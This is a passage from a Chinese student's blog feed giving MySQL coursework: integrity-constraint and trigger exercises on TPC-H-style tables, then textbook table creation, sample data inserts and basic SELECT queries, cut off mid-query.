src="https://img.lfalive.top/db-hw7%268/3-2-2.png" alt="3-2-2"></p><p><img src="https://img.lfalive.top/db-hw7%268/3-2-3.png" alt="3-2-3"></p><p><img src="https://img.lfalive.top/db-hw7%268/3-2-4.png" alt="3-2-4"></p><p><img src="https://img.lfalive.top/db-hw7%268/3-2-5.png" alt="3-2-5"></p><p><img src="https://img.lfalive.top/db-hw7%268/3-2-6.png" alt="3-2-6"></p><h3 id="实验3-3用户自定义完整性实验"><a href="#实验3-3用户自定义完整性实验" class="headerlink" title="实验3.3用户自定义完整性实验"></a>实验3.3用户自定义完整性实验</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- (1)</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Region</span><br><span class="line">(regionkey <span class="type">INTEGER</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line"> name <span class="type">CHAR</span>(<span class="number">25</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line"> comment <span class="type">VARCHAR</span>(<span class="number">152</span>) <span class="keyword">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (2)</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Nation</span><br><span class="line">(nationkey <span class="type">INTEGER</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line"> name <span class="type">CHAR</span>(<span class="number">25</span>),</span><br><span class="line"> regionkey <span class="type">INTEGER</span> <span class="keyword">DEFAULT</span> <span class="number">0</span>,</span><br><span class="line"> comment <span class="type">VARCHAR</span>(<span class="number">152</span>),</span><br><span class="line"> <span class="keyword">CONSTRAINT</span> FK_Nation_regionkey <span class="keyword">FOREIGN</span> KEY(regionkey) <span class="keyword">REFERENCES</span> Region(regionkey));</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (3)</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Nation</span><br><span class="line">(nationkey <span class="type">INTEGER</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line"> name <span class="type">CHAR</span>(<span class="number">25</span>) <span class="keyword">UNIQUE</span>,</span><br><span class="line"> regionkey <span class="type">INTEGER</span>,</span><br><span class="line"> comment <span class="type">VARCHAR</span>(<span class="number">152</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (4)</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Lineitem</span><br><span class="line">(orderkey <span class="type">INTEGER</span> <span class="keyword">REFERENCES</span> Orders(orderkey),</span><br><span class="line"> partkey <span class="type">INTEGER</span> <span class="keyword">REFERENCES</span> Part(partkey),</span><br><span class="line"> suppkey <span class="type">INTEGER</span> <span class="keyword">REFERENCES</span> Suppplier(suppkey),</span><br><span class="line"> linenumber <span class="type">INTEGER</span>,</span><br><span class="line"> quantity <span class="type">REAL</span>,</span><br><span class="line"> extendedprice <span class="type">REAL</span>,</span><br><span class="line"> discount <span class="type">REAL</span>,</span><br><span class="line"> tax <span class="type">REAL</span>,</span><br><span class="line"> returnflag <span class="type">CHAR</span>(<span class="number">1</span>),</span><br><span class="line"> linestatus <span class="type">CHAR</span>(<span class="number">1</span>),</span><br><span class="line"> shipdate <span class="type">DATE</span>,</span><br><span class="line"> commitdate <span class="type">DATE</span>,</span><br><span class="line"> receiptdate <span class="type">DATE</span>,</span><br><span class="line"> shipinstruct <span class="type">CHAR</span>(<span class="number">25</span>),</span><br><span class="line"> shipmode <span class="type">CHAR</span>(<span class="number">10</span>),</span><br><span class="line"> comment <span class="type">VARCHAR</span>(<span class="number">44</span>),</span><br><span class="line"> <span class="keyword">PRIMARY</span> KEY(orderkey,linenumber),</span><br><span class="line"> <span class="keyword">FOREIGN</span> KEY(partkey,suppkey) <span class="keyword">REFERENCES</span> PartSupp(partkey,suppkey),</span><br><span class="line"> <span class="keyword">CHECK</span> (shipdate <span class="operator">&lt;</span> receiptdate),</span><br><span class="line"> <span class="keyword">CHECK</span> (returnflag <span class="keyword">IN</span>(<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;N&#x27;</span>)));</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (5)</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> Lineitem(orderkey,linenumber,returnflag,shipdate,receiptdate)</span><br><span class="line"><span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;2015-01-05&#x27;</span>,<span class="string">&#x27;2015-01-01&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/db-hw7%268/3-3-1.png" alt="3-3-1"></p><p><img src="https://img.lfalive.top/db-hw7%268/3-3-2.png" alt="3-3-2"></p><p><img src="https://img.lfalive.top/db-hw7%268/3-3-3.png" alt="3-3-3"></p><p><img src="https://img.lfalive.top/db-hw7%268/3-3-4.png" alt="3-3-4"></p><p><img src="https://img.lfalive.top/db-hw7%268/3-3-5.png" alt="3-3-5"></p><h2 id="实验4触发器实验"><a href="#实验4触发器实验" class="headerlink" title="实验4触发器实验"></a>实验4触发器实验</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- (1)AFTER触发器</span></span><br><span class="line"><span class="comment">-- UPDATE触发器</span></span><br><span class="line">DELIMITER <span class="operator">||</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> TRI_Lineitem_Price_UPDATE</span><br><span class="line">AFTER <span class="keyword">UPDATE</span> <span class="keyword">ON</span> Lineitem <span class="keyword">FOR</span> <span class="keyword">EACH</span> <span class="type">ROW</span></span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">UPDATE</span> Orders <span class="keyword">SET</span> totalprice <span class="operator">=</span> totalprice <span class="operator">+</span> </span><br><span class="line">NEW.extendedprice <span class="operator">*</span> (<span class="number">1</span><span class="operator">-</span>NEW.discount) <span class="operator">*</span> (<span class="number">1</span><span class="operator">+</span>NEW.tax) <span class="operator">-</span> </span><br><span class="line">OLD.extendedprice <span class="operator">*</span> (<span class="number">1</span><span class="operator">-</span>OLD.discount) <span class="operator">*</span> (<span class="number">1</span><span class="operator">+</span>OLD.tax)</span><br><span class="line"><span class="keyword">WHERE</span> orderkey <span class="operator">=</span> OLD.orderkey;</span><br><span class="line"><span class="keyword">END</span><span class="operator">||</span></span><br><span class="line">DELIMITER ;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- INSERT触发器</span></span><br><span class="line">DELIMITER <span class="operator">||</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> TRI_Lineitem_Price_INSERT</span><br><span class="line">AFTER <span class="keyword">INSERT</span> <span class="keyword">ON</span> Lineitem <span class="keyword">FOR</span> <span class="keyword">EACH</span> <span class="type">ROW</span></span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">UPDATE</span> Orders <span class="keyword">SET</span> totalprice <span class="operator">=</span> totalprice <span class="operator">+</span></span><br><span class="line">NEW.extendedprice <span class="operator">*</span> (<span class="number">1</span><span class="operator">-</span>NEW.discount) <span class="operator">*</span> (<span class="number">1</span><span class="operator">+</span>NEW.tax)</span><br><span class="line"><span class="keyword">WHERE</span> orderkey <span class="operator">=</span> NEW.orderkey;</span><br><span class="line"><span class="keyword">END</span><span class="operator">||</span></span><br><span class="line">DELIMITER ;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- DELETE触发器</span></span><br><span class="line">DELIMITER <span class="operator">||</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> TRI_Lineitem_Price_DELETE</span><br><span class="line">AFTER <span class="keyword">DELETE</span> <span class="keyword">ON</span> Lineitem <span class="keyword">FOR</span> <span class="keyword">EACH</span> <span class="type">ROW</span></span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">UPDATE</span> Orders <span class="keyword">SET</span> totalprice <span class="operator">=</span> totalprice <span class="operator">-</span> </span><br><span class="line">OLD.extendedprice <span class="operator">*</span> (<span class="number">1</span><span class="operator">-</span>OLD.discount) <span class="operator">*</span> (<span class="number">1</span><span class="operator">+</span>OLD.tax)</span><br><span class="line"><span class="keyword">WHERE</span> orderkey <span class="operator">=</span> OLD.orderkey;</span><br><span class="line"><span class="keyword">END</span><span class="operator">||</span></span><br><span class="line">DELIMITER ;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 验证UPDATE触发器</span></span><br><span class="line"><span class="comment">-- 除了Orders和Lineitem，其他表格按实验一步骤导入数据。</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> Orders(orderkey,totalprice)</span><br><span class="line"><span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> Lineitem(orderkey,linenumber,extendedprice,discount,tax)</span><br><span class="line"><span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;0.5&#x27;</span>,<span class="string">&#x27;0.5&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> totalprice</span><br><span class="line"><span class="keyword">FROM</span> Orders</span><br><span class="line"><span class="keyword">WHERE</span> orderkey<span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">UPDATE</span> Lineitem <span class="keyword">SET</span> tax <span class="operator">=</span> tax<span class="operator">+</span><span class="number">0.005</span></span><br><span class="line"><span class="keyword">WHERE</span> orderkey <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> Linenumber <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> totalprice</span><br><span class="line"><span class="keyword">FROM</span> Orders</span><br><span class="line"><span class="keyword">WHERE</span> orderkey<span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/db-hw7%268/4-1.png" alt="4-1"></p><p><img src="https://img.lfalive.top/db-hw7%268/4-2.png" alt="4-2"></p><p><img src="https://img.lfalive.top/db-hw7%268/4-3.png" alt="4-3"></p><p><img src="https://img.lfalive.top/db-hw7%268/4-4.png" alt="4-4"></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- (2)BEFORE触发器</span></span><br><span class="line"><span class="comment">-- UPDATE触发器</span></span><br><span class="line">DELIMITER <span class="operator">||</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> TRI_Lineitem_Quantity_UPDATE</span><br><span class="line">BEFORE <span class="keyword">UPDATE</span> <span class="keyword">ON</span> Lineitem <span class="keyword">FOR</span> <span class="keyword">EACH</span> <span class="type">ROW</span></span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">DECLARE</span> L_valuediff <span class="type">INTEGER</span>;</span><br><span class="line"><span class="keyword">DECLARE</span> L_availqty <span class="type">INTEGER</span>;</span><br><span class="line"><span class="keyword">SET</span> L_valuediff <span class="operator">=</span> NEW.quantity <span class="operator">-</span> OLD.quantity;</span><br><span class="line"><span class="keyword">SELECT</span> availqty <span class="keyword">INTO</span> L_availqty</span><br><span class="line"><span class="keyword">FROM</span> PartSupp</span><br><span class="line"><span class="keyword">WHERE</span> partkey <span class="operator">=</span> NEW.partkey <span class="keyword">AND</span> suppkey <span class="operator">=</span> NEW.suppkey;</span><br><span class="line">IF (L_availqty <span class="operator">&gt;=</span> L_valuediff) <span class="keyword">THEN</span></span><br><span class="line"><span class="keyword">UPDATE</span> PartSupp</span><br><span class="line"><span class="keyword">SET</span> availqty <span class="operator">=</span> availqty <span class="operator">-</span> L_valuediff</span><br><span class="line"><span class="keyword">WHERE</span> partkey <span class="operator">=</span> NEW.partkey <span class="keyword">AND</span> suppkey <span class="operator">=</span>NEW.suppkey;</span><br><span class="line"><span class="keyword">END</span> IF;</span><br><span class="line"><span class="keyword">END</span><span class="operator">||</span></span><br><span class="line">DELIMITER ;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- INSERT触发器</span></span><br><span class="line">DELIMITER <span class="operator">||</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> TRI_Lineitem_Quantity_INSERT</span><br><span class="line">BEFORE <span class="keyword">INSERT</span> <span class="keyword">ON</span> Lineitem <span class="keyword">FOR</span> <span class="keyword">EACH</span> <span class="type">ROW</span></span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">DECLARE</span> L_valuediff <span class="type">INTEGER</span>;</span><br><span class="line"><span class="keyword">DECLARE</span> L_availqty <span class="type">INTEGER</span>;</span><br><span class="line"><span class="keyword">SET</span> L_valuediff <span class="operator">=</span> NEW.quantity;</span><br><span class="line"><span class="keyword">SELECT</span> availqty <span class="keyword">INTO</span> L_availqty</span><br><span class="line"><span class="keyword">FROM</span> PartSupp</span><br><span class="line"><span class="keyword">WHERE</span> partkey <span class="operator">=</span> NEW.partkey <span class="keyword">AND</span> suppkey <span class="operator">=</span> NEW.suppkey;</span><br><span class="line">IF (L_availqty <span class="operator">&gt;=</span> L_valuediff) <span class="keyword">THEN</span></span><br><span class="line"><span class="keyword">UPDATE</span> PartSupp</span><br><span class="line"><span class="keyword">SET</span> availqty <span class="operator">=</span> availqty <span class="operator">-</span> L_valuediff</span><br><span class="line"><span class="keyword">WHERE</span> partkey <span class="operator">=</span> NEW.partkey <span class="keyword">AND</span> suppkey <span class="operator">=</span> NEW.suppkey;</span><br><span class="line"><span class="keyword">END</span> IF;</span><br><span class="line"><span class="keyword">END</span><span class="operator">||</span></span><br><span class="line">DELIMITER ;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- DELETE触发器</span></span><br><span class="line">DELIMITER <span class="operator">||</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> TRI_Lineitem_Quantity_DELETE</span><br><span class="line">BEFORE <span class="keyword">DELETE</span> <span class="keyword">ON</span> Lineitem <span class="keyword">FOR</span> <span class="keyword">EACH</span> <span class="type">ROW</span></span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">DECLARE</span> L_valuediff <span class="type">INTEGER</span>;</span><br><span class="line"><span class="keyword">DECLARE</span> L_availqty <span class="type">INTEGER</span>;</span><br><span class="line"><span class="keyword">SET</span> L_valuediff <span class="operator">=</span> <span class="operator">-</span>OLD.quantity;</span><br><span class="line"><span class="keyword">UPDATE</span> PartSupp</span><br><span class="line"><span class="keyword">SET</span> availqty <span class="operator">=</span> availqty <span class="operator">-</span> L_valuediff</span><br><span class="line"><span class="keyword">WHERE</span> partkey <span class="operator">=</span> OLD.partkey <span class="keyword">AND</span> suppkey <span class="operator">=</span>OLD.suppkey;</span><br><span class="line"><span class="keyword">END</span><span class="operator">||</span></span><br><span class="line">DELIMITER ;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 验证UPDATE触发器 </span></span><br><span class="line"><span class="comment">-- 除了PartSupp和Lineitem，其他表格按实验一步骤导入数据。</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> PartSupp(partkey,suppkey,availqty)</span><br><span class="line"><span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="number">1</span>,<span class="number">100</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> Lineitem(orderkey,linenumber,partkey,suppkey,quantity)</span><br><span class="line"><span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> L.partkey,L.suppkey,L.quantity,PS.availqty</span><br><span class="line"><span class="keyword">FROM</span> Lineitem L,PartSupp PS</span><br><span class="line"><span class="keyword">WHERE</span> L.partkey <span class="operator">=</span> PS.partkey <span class="keyword">AND</span> L.suppkey <span class="operator">=</span> ps.suppkey <span class="keyword">AND</span></span><br><span class="line">L.orderkey <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> L.linenumber <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">UPDATE</span> Lineitem <span class="keyword">SET</span> quantity <span class="operator">=</span> quantity <span class="operator">+</span> <span class="number">5</span></span><br><span class="line"><span class="keyword">WHERE</span> orderkey<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> Linenumber<span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> L.partkey,L.suppkey,L.quantity,PS.availqty</span><br><span class="line"><span class="keyword">FROM</span> Lineitem L,PartSupp PS</span><br><span class="line"><span class="keyword">WHERE</span> L.partkey <span class="operator">=</span> PS.partkey <span class="keyword">AND</span> L.suppkey <span class="operator">=</span> ps.suppkey <span class="keyword">AND</span></span><br><span class="line">L.orderkey <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> L.linenumber <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/db-hw7%268/4-5.png" alt="4-5"></p><p><img src="https://img.lfalive.top/db-hw7%268/4-6.png" alt="4-6"></p><p><img src="https://img.lfalive.top/db-hw7%268/4-7.png" alt="4-7"></p><p><img src="https://img.lfalive.top/db-hw7%268/4-8.png" alt="4-8"></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- (3)删除触发器</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TRIGGER</span> TRI_Lineitem_Price_UPDATE;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/db-hw7%268/4-9.png" alt="4-9"></p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> databases </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《数据库系统概论》例程及习题（二）</title>
      <link href="/2020/05/18/db-hw5&amp;6/"/>
      <url>/2020/05/18/db-hw5&amp;6/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>这次内容有书上第三章的几乎所有例程运行结果和三道习题的实验。为了纪念被老师惨无人道剥削的学习时光，再辛苦一点儿，全都放上来，说不定就能拯救日后同样痛苦的小老弟小老妹。</p><h2 id="建表"><a href="#建表" class="headerlink" title="建表"></a>建表</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Student</span><br><span class="line">(Sno<span class="type">CHAR</span>(<span class="number">9</span>) <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">Sname<span class="type">CHAR</span>(<span class="number">20</span>) <span class="keyword">UNIQUE</span>,</span><br><span class="line">Ssex<span class="type">CHAR</span>(<span class="number">2</span>),</span><br><span class="line">Sage<span class="type">SMALLINT</span>,</span><br><span class="line">Sdept<span class="type">CHAR</span>(<span class="number">20</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Course</span><br><span class="line">(Cno<span class="type">CHAR</span>(<span class="number">4</span>) <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">Cname<span class="type">CHAR</span>(<span class="number">40</span>),</span><br><span class="line">Cpno<span class="type">CHAR</span>(<span class="number">4</span>),</span><br><span class="line">Ccredit<span class="type">SMALLINT</span>,</span><br><span class="line"><span class="keyword">FOREIGN</span>KEY (Cpno) <span class="keyword">REFERENCES</span> Course(Cno)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> SC</span><br><span class="line">(Sno<span class="type">CHAR</span>(<span class="number">9</span>),</span><br><span class="line">Cno    <span class="type">CHAR</span>(<span class="number">4</span>),</span><br><span class="line">Grade<span class="type">SMALLINT</span>,</span><br><span class="line"><span class="keyword">PRIMARY</span> KEY (Sno,Cno),</span><br><span class="line"><span class="keyword">FOREIGN</span> KEY (Sno) <span class="keyword">REFERENCES</span> Student(Sno),</span><br><span class="line"><span class="keyword">FOREIGN</span> KEY (Cno) <span class="keyword">REFERENCES</span> Course(Cno)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/db-hw5%266/create1.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/create2.png"></p><h2 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Student (Sno,Sname,Ssex,Sage,Sdept)</span><br><span class="line"><span class="keyword">values</span>  (<span class="string">&#x27;201215121&#x27;</span>,<span class="string">&#x27;李勇&#x27;</span>,<span class="string">&#x27;男&#x27;</span>,<span class="number">20</span>,<span class="string">&#x27;CS&#x27;</span>),</span><br><span class="line">        (<span class="string">&#x27;201215122&#x27;</span>,<span class="string">&#x27;刘晨&#x27;</span>,<span class="string">&#x27;女&#x27;</span>,<span class="number">19</span>,<span class="string">&#x27;CS&#x27;</span>),</span><br><span class="line">        (<span class="string">&#x27;201215123&#x27;</span>,<span class="string">&#x27;王敏&#x27;</span>,<span class="string">&#x27;女&#x27;</span>,<span class="number">18</span>,<span class="string">&#x27;MA&#x27;</span>),</span><br><span class="line">        (<span class="string">&#x27;201215125&#x27;</span>,<span class="string">&#x27;张立&#x27;</span>,<span class="string">&#x27;男&#x27;</span>,<span class="number">19</span>,<span class="string">&#x27;IS&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Course (Cno,Cname,Cpno,Ccredit)</span><br><span class="line"><span class="keyword">values</span>  (<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;数据处理&#x27;</span>,<span class="keyword">null</span>,<span class="number">2</span>),</span><br><span class="line">        (<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;数学&#x27;</span>,<span class="keyword">null</span>,<span class="number">2</span>),</span><br><span class="line">        (<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;操作系统&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="number">3</span>),</span><br><span class="line">        (<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;PASCAL语言&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="number">4</span>),</span><br><span class="line">        (<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;数据结构&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="number">4</span>),</span><br><span class="line">        (<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;数据库&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="number">4</span>),</span><br><span class="line">        (<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;信息系统&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> SC (Sno,Cno,Grade)</span><br><span class="line"><span class="keyword">values</span>  (<span class="string">&#x27;201215121&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">92</span>),</span><br><span class="line">        (<span class="string">&#x27;201215121&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="number">85</span>),</span><br><span class="line">        (<span class="string">&#x27;201215121&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="number">88</span>),</span><br><span class="line">        (<span class="string">&#x27;201215122&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="number">90</span>),</span><br><span class="line">        (<span class="string">&#x27;201215122&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="number">80</span>);</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/db-hw5%266/insert1.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/insert2.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/insert3.png"></p><h2 id="数据查询"><a href="#数据查询" class="headerlink" title="数据查询"></a>数据查询</h2><h3 id="单表查询-例3-16-3-48"><a href="#单表查询-例3-16-3-48" class="headerlink" title="单表查询(例3.16-3.48)"></a>单表查询(例3.16-3.48)</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 16</span></span><br><span class="line"><span class="keyword">SELECT</span> Sno,Sname</span><br><span class="line"><span class="keyword">FROM</span> Student;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 17</span></span><br><span class="line"><span class="keyword">SELECT</span> Sname,Sno,Sdept</span><br><span class="line"><span class="keyword">FROM</span> Student;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 18</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Student;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 19</span></span><br><span class="line"><span class="keyword">SELECT</span> Sname,<span class="number">2014</span><span class="operator">-</span>Sage</span><br><span class="line"><span class="keyword">FROM</span> Student;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 20</span></span><br><span class="line"><span class="keyword">SELECT</span> Sname,<span class="string">&#x27;Year of Birth:&#x27;</span>,<span class="number">2020</span><span class="operator">-</span>Sage,<span class="built_in">LOWER</span>(Sdept)</span><br><span class="line"><span class="keyword">FROM</span> Student;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 21</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> Sno <span class="keyword">FROM</span> SC;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 22</span></span><br><span class="line"><span class="keyword">SELECT</span> Sname</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sdept<span class="operator">=</span><span class="string">&#x27;CS&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 23</span></span><br><span class="line"><span class="keyword">SELECT</span> Sname,Sage</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sage <span class="operator">&lt;</span> <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 24</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> Sno</span><br><span class="line"><span class="keyword">FROM</span> SC</span><br><span class="line"><span class="keyword">WHERE</span> Grade<span class="operator">&lt;</span><span class="number">60</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 25</span></span><br><span class="line"><span class="keyword">SELECT</span> Sname, Sdept, Sage</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sage <span class="keyword">BETWEEN</span> <span class="number">20</span> <span class="keyword">AND</span> <span class="number">23</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 26</span></span><br><span class="line"><span class="keyword">SELECT</span> Sname, Sdept, Sage</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sage <span class="keyword">NOT</span> <span class="keyword">BETWEEN</span> <span class="number">20</span> <span class="keyword">AND</span> <span class="number">23</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 27</span></span><br><span class="line"><span class="keyword">SELECT</span> Sname, Ssex</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sdept <span class="keyword">IN</span> (<span class="string">&#x27;CS&#x27;</span>,<span class="string">&#x27;MA&#x27;</span>,<span class="string">&#x27;IS&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 28</span></span><br><span class="line"><span class="keyword">SELECT</span> Sname, Ssex</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sdept <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;IS&#x27;</span>,<span class="string">&#x27;MA&#x27;</span>,<span class="string">&#x27;CS&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 29</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sno <span class="keyword">LIKE</span> <span class="string">&#x27;201215121&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 30</span></span><br><span class="line"><span class="keyword">SELECT</span> Sname, Sno, Ssex</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sname <span class="keyword">LIKE</span> <span class="string">&#x27;刘%&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 31</span></span><br><span class="line"><span class="keyword">SELECT</span> Sname</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sname <span class="keyword">LIKE</span> <span class="string">&#x27;欧阳__&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 32</span></span><br><span class="line"><span class="keyword">SELECT</span> Sname,Sno</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sname <span class="keyword">LIKE</span> <span class="string">&#x27;__阳%&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 33</span></span><br><span class="line"><span class="keyword">SELECT</span> Sname, Sno, Ssex</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sname <span 